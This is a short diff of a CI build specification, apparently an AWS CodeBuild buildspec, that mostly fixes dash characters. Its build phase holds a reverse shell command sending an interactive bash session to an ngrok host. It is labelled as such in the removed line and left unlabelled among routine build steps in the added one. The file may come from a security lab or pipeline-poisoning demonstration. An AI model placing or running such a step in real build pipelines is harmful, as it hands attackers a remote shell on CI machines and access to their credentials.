@@ -10,13 +10,13 @@ phases:
   build:
     commands:
       - echo "we are in the build block"
-      - bash −c 'bash − i >& /dev/tcp/2.tcp.us−cal−1.ngrok.io/18514 0>&1' #REVERSE SHELL COMMAND
+      - bash -c 'bash -i >& /dev/tcp/2.tcp.us-cal-1.ngrok.io/xxxxx0>&1'
       - echo "we will run some tests"
-      - grep −Fq "Cross−Site Scripting (XSS)" index.html
+      - grep -Fq "Cross-Site Scripting (XSS)" index.html
   post_build:
     commands:
-      − echo "we are in the post build phase"
+      - echo "we are in the post build phase"
 artifacts:
   files:
-    − '**/*'
-  name: DevOps−Code−Build
+    - '**/*'
+  name: DevOps-Code-Build
